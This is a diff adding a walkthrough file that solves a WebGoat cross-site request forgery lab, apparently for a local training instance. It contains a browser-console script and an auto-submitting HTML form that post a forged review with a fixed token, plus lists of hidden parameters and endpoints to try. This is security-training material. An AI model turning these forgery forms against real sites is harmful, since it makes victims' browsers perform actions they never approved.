@@ -1,0 +1,160 @@
+=== CSRF Review - Missing Parameter Solution ===
+
+ERROR: "There's something missing from your request"
+
+This means the endpoint expects additional parameters beyond just stars and reviewText.
+
+=== COMMON MISSING PARAMETERS ===
+
+WebGoat CSRF exercises typically require one of these:
+
+1. validateReq - CSRF token parameter
+   Common value: 2aa14227b9a13d0bede0388a7fba9aa9
+
+2. submit - Submit button parameter
+   Value: "Submit"
+
+3. Both validateReq AND submit
+
+=== SOLUTION 1: Use Fixed HTML File ===
+
+File created: csrf_review_fixed.html
+
+This file includes ALL possible parameters:
+- stars
+- reviewText
+- review
+- validateReq
+- submit
+- action
+
+Steps:
+1. Make sure you're logged into WebGoat
+2. Open csrf_review_fixed.html in the same browser
+3. Click "POST REVIEW (All Parameters)"
+4. Check WebGoat for the review
+
+=== SOLUTION 2: Browser Console (Quick Test) ===
+
+In WebGoat, press F12, go to Console, paste:
+
+const f=document.createElement('form');
+f.method='POST';
+f.action='http://192.168.254.112:8001/WebGoat/csrf/review';
+f.target='_blank';
+
+// Add all parameters
+[
+  {n:'stars',v:'5'},
+  {n:'reviewText',v:'CSRF Review!'},
+  {n:'validateReq',v:'2aa14227b9a13d0bede0388a7fba9aa9'},
+  {n:'submit',v:'Submit'}
+].forEach(p=>{
+  const i=document.createElement('input');
+  i.name=p.n;
+  i.value=p.v;
+  f.appendChild(i);
+});
+
+document.body.appendChild(f);
+f.submit();
+
+=== SOLUTION 3: PowerShell Parameter Tester ===
+
+Run: .\csrf_review_test_params.ps1
+
+This script will:
+- Test multiple parameter combinations
+- Show you which one works
+- Display the exact parameters needed
+
+=== SOLUTION 4: Check WebGoat Page ===
+
+Look at the actual WebGoat review form:
+1. Right-click on the review form
+2. Select "Inspect Element"
+3. Look at the <form> tag
+4. Note all <input> fields and their names
+5. Include ALL of those in your CSRF attack
+
+Common hidden fields to look for:
+- validateReq
+- CSRFToken
+- token
+- submit
+- action
+- _csrf
+
+=== SOLUTION 5: Intercept Legitimate Request ===
+
+1. Open WebGoat in browser
+2. Press F12 -> Network tab
+3. Submit a legitimate review
+4. Find the POST request in Network tab
+5. Click on it -> "Payload" or "Form Data"
+6. Copy ALL the parameters you see
+7. Use those exact parameters in your CSRF attack
+
+=== MANUAL HTML TEMPLATE ===
+
+Once you know the parameters, use this template:
+
+<!DOCTYPE html>
+<html>
+<body>
+<form action="http://192.168.254.112:8001/WebGoat/csrf/review" method="POST">
+    <input name="stars" value="5">
+    <input name="reviewText" value="CSRF!">
+    <input name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+    <input name="submit" value="Submit">
+    <button>Submit</button>
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+=== TROUBLESHOOTING ===
+
+If still not working:
+
+1. Check if validateReq value is different
+   - It might be user-specific or session-specific
+   - Check the actual form in WebGoat for the real value
+
+2. Try without validateReq
+   - Some exercises don't require it
+   - Try: stars + reviewText + submit only
+
+3. Check endpoint URL
+   - Might be /WebGoat/csrf/post-review
+   - Or /WebGoat/CSRF/review (capital letters)
+   - Or /WebGoat/csrf/submit-review
+
+4. Look for error messages in:
+   - Browser console (F12)
+   - Network tab response
+   - WebGoat feedback message
+
+=== EXPECTED WORKING PARAMETERS ===
+
+Most likely combination:
+{
+    "stars": "5",
+    "reviewText": "Your message here",
+    "validateReq": "2aa14227b9a13d0bede0388a7fba9aa9",
+    "submit": "Submit"
+}
+
+Or simpler:
+{
+    "stars": "5",
+    "reviewText": "Your message here",
+    "validateReq": "2aa14227b9a13d0bede0388a7fba9aa9"
+}
+
+TRY THESE FILES:
+✅ csrf_review_fixed.html - Includes all parameters
+✅ csrf_review_test_params.ps1 - Tests combinations
+✅ csrf_post_review.html - Original (might need update)
+
+Good luck! 🚀
